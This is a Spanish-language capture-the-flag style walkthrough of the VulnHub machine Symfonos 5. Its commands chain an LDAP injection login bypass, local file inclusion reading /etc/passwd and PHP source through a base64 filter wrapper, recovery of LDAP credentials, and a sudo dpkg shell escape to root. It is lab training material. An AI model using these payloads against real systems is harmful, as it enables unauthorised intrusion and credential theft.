---
layout: single
title: Symfonos 5 - VulnHub
excerpt: " Beginner real life based machine designed to teach people the importance of understanding from the interior. "
date: 2023-02-16
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-symfonos5/symfonos5.jpg
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - ldap
  - wrappers
  - PHP
  - injection
  - LFI
---

Beginner real life based machine designed to teach people the importance of understanding from the interior.

# Summary
- IP: 192.168.1.37
- Ports: 22,80,389,636
- OS: Linux (Debian)
- Services & Applications:
	-  22 -> OpenSSH 7.9p1 Debian 10+deb10u1
	-  80 -> Apache httpd 2.4.29
	-  389 -> OpenLDAP 2.2.X - 2.3.X
	-  636 -> ldapssl? 

# Recon

- Escaneo básico de puertos:  

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.37 -oG allPorts
```


- Escaneo profundo de puertos encontrados:  

```bash
$nmap -p22,80,389,636 -sCV 192.168.1.37 -oN targeted
```

- Escaneo de directorios con gobuster:  

```bash
$gobuster dir -u 192.168.1.37 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```

```bash
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/admin.php            (Status: 200) [Size: 1650]
/.hta                 (Status: 403) [Size: 277] 
/index.html           (Status: 200) [Size: 207] 
/server-status        (Status: 403) [Size: 277] 
/static               (Status: 301) [Size: 313] [--> http://192.168.1.37/static/]
```


# Escaneo básico de ldap (puerto 389 y 636):

- Al tener abiertos los puertos 389 y 636, podemos intentar enumerar información contemplada en el protocolo ldap, en HackTricks podemos encontrar la fuente de este escaneo: [389, 636, 3268, 3269 - Pentesting LDAP - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

- Primero, nos intentamos logear con una autenticación simple, buscando enumerar el "namingcontexts".

```bash
$ldapsearch -x -H ldap://192.168.1.37 -s base namingcontexts
```

nos reporta el siguiente namingcontexts:

```
namingContexts: dc=symfonos,dc=local
```

- Intentamos autenticarnos con el dc encontrado en busca de enumerar usuarios, contraseñas, etc:

```bash
$ldapsearch -x -H ldap://192.168.1.37 -D "dc=symfonos,dc=local"
```

Nos reporta el siguiente mensaje:

```bash
ldap_bind: Server is unwilling to perform (53)
	additional info: unauthenticated bind (DN with no password) disallowed
```

- Esto nos dice que necesitamos sí o sí de alguna credencial para poder autenticarnos, así que por ahora pausamos el análisis de ldap y exploramos otros vectores de ataque.

# Análisis de página web:

- En la web principal no encontramos nada interesante, sin embargo, en el escaneo hecho previamente con gobuster encontramos un recurso "/admin.php", accedemos y vemos un login.

- Intentamos Bypassear con SQLI pero no da resultados.


# LDAP Injection authentication bypass:

- Sabiendo que ldap está corriendo por detrás, intentamos inyectar ldap, visto en una de las muchas técnicas de "Login Bypass" en HackTricks, [Login Bypass - HackTricks](https://book.hacktricks.xyz/pentesting-web/login-bypass)

- Inyectamos el símbolo * en los campos de usuario y contrtaseña y accedemos.

- No vemos nada en la página a la que nos redirige, sin embargo, si damos click en la pestaña de "Portraits" nos damos cuenta que el enlace podría ser vulnerable, ya que está estructurado de la siguiente forma:

```
http://192.168.1.37/home.php?url=http://127.0.0.1/portraits.php
```


# LFI y uso de Wrappers:

- Probamos LFI ya que se está llamando a un parámetro "url":

```
http://192.168.1.37/home.php?url=/etc/passwd
```

- Y efectivamente podemos ver el contenido del "/etc/passwd".

- Hacemos una búsqueda básica de LFI pero no encontramos nada interesante.

- Recordamos que existe un recurso "admin.php" el cual podría contener dentro del código información que nos resulte útil; lo abrimos suponiendo que está en /var/www/html/admin.php:

```
http://192.168.1.37/home.php?url=/var/www/html/admin.php
```

- Pero vemos que el navegador lógicamente nos interpreta el recurso dirigiéndonos al login.

- Para ver el código por detrás del recurso "admin.php" podemos hacer uso de Wrappers, en este caso, uno que convierta en base64 el contenido del archivo php para luego en nuestra máquina atacante decodearlo:

```
http://192.168.1.37/home.php?url=php://filter/read=convert.base64-encode/resource=/var/www/html/admin.php
```

- Copiamos el contenido en base64 y lo decodeamos guardándolo en un archivo llamado "admin.php":

```bash
$echo -n "contenido en base64" | base64 -d > admin.php
```

- Abrimos el archivo creado y analizamos el código.

- En una parte del código vemos un posible usuario y contraseña:

```php
$bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");
```

- Con esta información podríamos continuar con nuestro escaneo y enumeración de ldap.


# Escaneo básico de ldap (puerto 389 y 636):

- Al ya tener un posible usuario y contraseña, nos intentamos autenticar con el dc encontrado anteriormente y enumerar toda la información posible:

```bash
$ldapsearch -x -H ldap://192.168.1.37 -D "cn=admin,dc=symfonos,dc=local" -w "contraseña" -b "dc=symfonos,dc=local"
```

- Obtenemos bastante información proporcionada por el protocolo ldap, tomamos en cuenta la más importante:

```bash
# admin, symfonos.local
dn: cn=admin,dc=symfonos,dc=local
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator
userPassword:: e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=

# zeus, symfonos.local
dn: uid=zeus,dc=symfonos,dc=local
uid: zeus
cn: zeus
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/zeus
uidNumber: 14583102
gidNumber: 14564100
userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==
mail: zeus@symfonos.local
gecos: Zeus User
```

- Como podemos ver, hay usuario del sistema con el nombre "zeus" y la password está contemplada en base64, la decodeamos e intentamos acceder por SSH:

```bash
echo -n "Y2V0a0tmNHdDdUhDOUZFVA==" | base64 -d; echo
```

```bash
$ssh zeus@192.168.1.37
```

- Ya habremos ganado al sistema como el usuario "zeus".


# ESCALANDO PRIVILEGIOS:

- Vemos permisos de sudoers y encontramos lo siguiente:

```bash
zeus@symfonos5:~$ sudo -l
Matching Defaults entries for zeus on symfonos5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zeus may run the following commands on symfonos5:
    (root) NOPASSWD: /usr/bin/dpkg
```

- Como podemos apreciar, podemos ejecutar el binario "dpkg" como root sin contraseña, haciendo una búsqueda en [GTFOBins](https://gtfobins.github.io/) nos encontramos con los siguientes comandos que podemos usar para escalar privilegios haciendo uso de este binario:

```
sudo dpkg -l
!/bin/sh
```

- Lo ejecutamos y seremos root.
